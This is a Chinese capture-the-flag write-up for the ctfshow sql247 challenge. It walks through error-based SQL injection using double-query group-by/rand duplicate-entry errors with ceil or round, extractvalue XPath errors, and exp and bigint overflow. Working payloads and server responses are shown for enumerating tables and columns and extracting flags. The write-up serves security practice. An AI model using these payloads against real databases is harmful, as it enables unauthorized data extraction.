# ctfshow-sql247



##### 参考链接

其他大佬链接

feng  https://blog.csdn.net/rfrder/article/details/113759746

Je3    https://blog.csdn.net/jvkyvly/article/details/115458909

Y4	 https://blog.csdn.net/solitudi/article/details/110144623

郁离歌大佬 https://blog.csdn.net/like98k/article/details/79436463



 查询语句 

```
 //备份表
  $sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";

```



 返回逻辑 

```
  //无过滤
  过滤updatexml extractvalue floor
      
```



```
如果还是考虑双查询注入的话，把floor给过滤了，考虑到rand()*2是0-2的范围，所以不用floor，ceil也可以，是向上取整。round函数也可以，

返回将 x 根据指定精度 prec （十进制小数点后数字的数目）进行四舍五入的结果。prec 也可以是负数或零（默认值）
ROUND(X) – 表示将值 X 四舍五入为整数，无小数位
ROUND(X,D) – 表示将值 X 四舍五入为小数点后 D 位的数值，D为小数点后小数位数。若要保留 X 值小数点左边的 D 位，可将 D 设为负值。
echo(round(0.60));
echo(round(0.50));
echo(round(0.49));
echo(round(-4.40));
echo(round(-4.60));
1
1
0
-4
-5





ceil 
ceil() 函数向上舍入为最接近的整数。
ceil(x)x必需。一个数。
返回不小于 x 的下一个整数，x 如果有小数部分则进一位。ceil() 返回的类型仍然是 float，因为 float 值的范围通常比 integer 要大。
echo(ceil(0.60);
echo(ceil(0.40);
echo(ceil(5);
echo(ceil(5.1);
echo(ceil(-5.1);
echo(ceil(-5.9));
1
1
5
6
-5
-5



sql注入--双查询报错注入
https://www.cnblogs.com/laoxiajiadeyun/p/10278512.html

sqli-labs-Less5 关于各种报错注入的学习
https://blog.csdn.net/rfrder/article/details/108674217

郁离歌大佬
https://blog.csdn.net/like98k/article/details/79436463

利用double 数值类型超出范围进行报错注入
http://43.247.91.228:84/Less-5/?id=1' union select (exp(~(select * FROM(SELECT USER())a))),2,3--+
利用bigint 溢出进行报错注入
http://43.247.91.228:84/Less-5/?id=1' union select (!(select * from (select user())x) - ~0),2,3--+
利用xpath 函数报错注入
http://43.247.91.228:84/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+

不能用group_concat，必须用limit，不知道为什么

发送失败可能为没有成功
多发几次就可以
?id=' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,ceil(rand()*2))a from information_schema.columns group by a-- -


{"code":0,"msg":"Duplicate entry 'ctfshow_flagsa~1' for key 'group_key'","count":1,"data":[]}

ctfshow_flagsa


?id=' union select 1,count(*),concat((select column_name from information_schema.columns where table_name='ctfshow_flagsa' limit 1,1),0x7e,ceil(rand()*2))a from information_schema.columns group by a-- -

{"code":0,"msg":"Duplicate entry 'flag?~1' for key 'group_key'","count":1,"data":[]}

flag?


?id=' union select 1,count(*),concat((select `flag?` from ctfshow_flagsa),0x7e,ceil(rand()*2))a from information_schema.columns group by a-- -


{"code":0,"msg":"Duplicate entry 'ctfshow{b86c40c3-0f69-4431-8915-22c4c8d53472}~1' for key 'group_key'","count":1,"data":[]}

ctfshow{b86c40c3-0f69-4431-8915-22c4c8d53472}

```







```mysql
extractvalue被过滤了，还有双查询报错

/api
get传参


?id=' or extractvalue(1,concat(0x7e,database(),0x7e))-- -
~ctfshow_web~


因为xpath的报错只有32位，所以需要截取

?id=' or extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),1))-- -


{"code":0,"msg":"XPATH syntax error: 'banlist,ctfshow_flagsa,ctfshow_u'","count":1,"data":[]}
少了应该是ctfshow_user
banlist,ctfshow_flagsa,ctfshow_user


?id=' or extractvalue(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagsa'),1))-- -

{"code":0,"msg":"XPATH syntax error: 'id,flag1,info1'","count":1,"data":[]}



?id=' or extractvalue(1,concat(1,substr((select group_concat(flag1) from ctfshow_flagsa),1,32),1))-- -

{"code":0,"msg":"XPATH syntax error: 'ctfshow{9d25c68a-6712-4cad-96d3-'","count":1,"data":[]}
ctfshow{9d25c68a-6712-4cad-96d3-

?id=' or extractvalue(1,concat(1,substr((select group_concat(flag1) from ctfshow_flagsa),20,32),1))-- -
{"code":0,"msg":"XPATH syntax error: 'cad-96d3-1e1819039ad5}1'","count":1,"data":[]}


ctfshow{9d25c68a-6712-4cad-96d3-1e1819039ad5}
```























